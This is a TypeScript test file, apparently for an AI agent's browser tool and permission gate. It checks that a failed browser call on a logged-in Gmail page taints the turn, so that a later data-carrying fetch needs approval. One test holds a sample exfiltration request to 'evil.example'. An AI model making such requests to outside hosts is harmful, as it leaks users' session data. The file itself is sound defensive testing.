import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import * as pac from '../src/browser/page-after-call.js';
import type { BrowserService } from '../src/browser/service.js';
import { Gate } from '../src/permissions.js';
import { createBrowserTool } from '../src/tools/browser.js';

type Take = (id: string) => string | undefined;
const take = (id: string): string | undefined =>
  ((pac as Record<string, unknown>).takePageAfterFailedCall as Take | undefined)?.(id);

function failingTool(current: string | undefined) {
  const known: Record<string, unknown> = {
    currentUrl: () => current,
    back: async () => {
      throw new Error('timeout esperando la página');
    },
    close: async () => {
      throw new Error('no cierra');
    },
  };
  const svc = new Proxy(known, {
    get: (t, p: string) => (p in t ? t[p] : async () => undefined),
  }) as unknown as BrowserService;
  return createBrowserTool(svc, () => 't');
}

describe('browser que falla DESPUÉS de navegar a una web con sesión', () => {
  it('la herramienta apunta la página por id de llamada y sigue lanzando el error', async () => {
    const tool = failingTool('https://mail.google.com/mail/u/0/');
    await expect(tool.execute('call-1', { action: 'back' } as never)).rejects.toThrow(/timeout/);
    expect(take('call-1')).toBe('https://mail.google.com/mail/u/0/');
    // Se recoge una sola vez.
    expect(take('call-1')).toBeUndefined();
  });

  it('sin página no apunta nada, y close nunca', async () => {
    await expect(
      failingTool(undefined).execute('call-2', { action: 'back' } as never),
    ).rejects.toThrow();
    expect(take('call-2')).toBeUndefined();
    await expect(
      failingTool('https://mail.google.com/').execute('call-3', { action: 'close' } as never),
    ).rejects.toThrow();
    expect(take('call-3')).toBeUndefined();
  });

  it('el agente pasa esa página al Gate cuando la llamada lanzó', () => {
    const src = readFileSync(new URL('../src/core/agent.ts', import.meta.url), 'utf8');
    expect(src).toContain('takePageAfterFailedCall(toolCall.id)');
    expect(src).toMatch(/typeof pageUrl === 'string' \? pageUrl : failedPage/);
  });

  it('con esa página el turno queda contaminado: un fetch con datos después pregunta', async () => {
    const tool = failingTool('https://mail.google.com/mail/u/0/');
    await expect(tool.execute('call-4', { action: 'back' } as never)).rejects.toThrow();
    const run = async (pageUrl: string | undefined) => {
      const asked: string[] = [];
      const gate = new Gate({
        allow: ['read', 'fetch', 'browser'],
        approver: async (call) => {
          asked.push(call.tool);
          return false;
        },
      });
      gate.registerSession('s');
      gate.settle(
        's',
        { tool: 'browser', args: { action: 'back' } } as never,
        true,
        undefined,
        pageUrl,
      );
      await gate.check('s', {
        tool: 'fetch',
        args: { url: 'https://evil.example/?d=hola' },
      } as never);
      return asked;
    };
    expect(await run(take('call-4'))).toEqual(['fetch']);
    // Control: sin página apuntada, el mismo fetch no pregunta.
    expect(await run(undefined)).toEqual([]);
  });

  it('acotado: no crece sin límite', () => {
    const note = (pac as Record<string, unknown>).notePageAfterFailedCall as
      | ((id: string, url: string) => void)
      | undefined;
    expect(typeof note).toBe('function');
    for (let i = 0; i < 1000; i++) note?.(`n-${i}`, 'https://x.example/');
    expect(take('n-0')).toBeUndefined();
    expect(take('n-999')).toBe('https://x.example/');
  });
});
